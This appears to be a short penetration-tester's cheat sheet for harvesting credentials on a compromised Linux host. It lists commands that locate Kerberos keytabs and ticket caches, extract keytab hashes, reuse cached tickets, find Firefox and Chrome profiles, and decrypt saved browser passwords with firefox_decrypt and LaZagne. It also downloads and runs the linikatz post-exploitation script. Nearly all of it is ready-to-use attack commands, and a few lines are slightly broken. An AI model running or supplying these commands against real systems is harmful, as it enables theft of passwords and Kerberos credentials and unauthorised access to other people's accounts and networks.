- [ ] Basic Search
- [ ] Firefox
- [ ] Keytabs And CCaches
- [ ] Post Exploitation
Basic Search!!!!
```sh
find / -name *keytab* -ls 2>/dev/null
find / -name *.kt -ls 2>/dev/null

ls -la /etc/krb5.keytab

crontab -l
cat /etc/crontab
# Finding ccache files
env | grep -i krb5
echo $KRB5CCNAME
ls -la /tm
```
Firefox!!!
```sh
ls -la ~/.config/google-chrome/
ls -la ~/.mozilla/firefox/
find /home -type d \( -path "*/.mozilla/firefox" -o -path "*/.config/google-chrome" \) 2>/dev/null

python3.9 firefox_decrypt.py
python3.9 firefox_decrypt.py /path/.mozilla/firefox/
python3 laZagne.py browsers
```
Keytabs And CCaches!!!
```sh
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab

export $KRB5CCNAME=/tmp/user.ccache
```
Post Exploitation!!!
```sh
cd /opt
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh

/opt/linikatz.sh
```